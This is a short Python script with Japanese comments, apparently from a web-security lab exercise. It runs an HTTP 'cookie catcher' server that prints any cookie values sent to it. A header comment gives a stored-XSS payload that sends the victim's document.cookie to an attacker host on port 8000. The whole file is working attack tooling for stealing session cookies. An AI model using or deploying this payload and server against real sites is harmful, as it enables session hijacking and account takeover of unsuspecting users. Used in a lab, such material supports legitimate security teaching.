#!/usr/bin/env python3
# ============================================================
#  簡易 cookie catcher (XSS で盗んだ値を受け取るサーバ)
#  使い方:  python3 catcher.py
#  payload 例 (stored XSS に投稿):
#    <script>new Image().src='http://attacker:8000/?c='+document.cookie</script>
#  ※ホストのブラウザから見る場合、attacker は直接解決できないため
#    発展課題として headless ブラウザ/同一ネットワーク内で利用する。
# ============================================================
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        stolen = q.get("c", ["(なし)"])[0]
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] from {self.client_address[0]}  cookie => {stolen}", flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        self.wfile.write(b"")
    def log_message(self, *_):  # デフォルトのアクセスログは抑制
        pass

if __name__ == "__main__":
    print("cookie catcher listening on :8000  (Ctrl-C で停止)", flush=True)
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
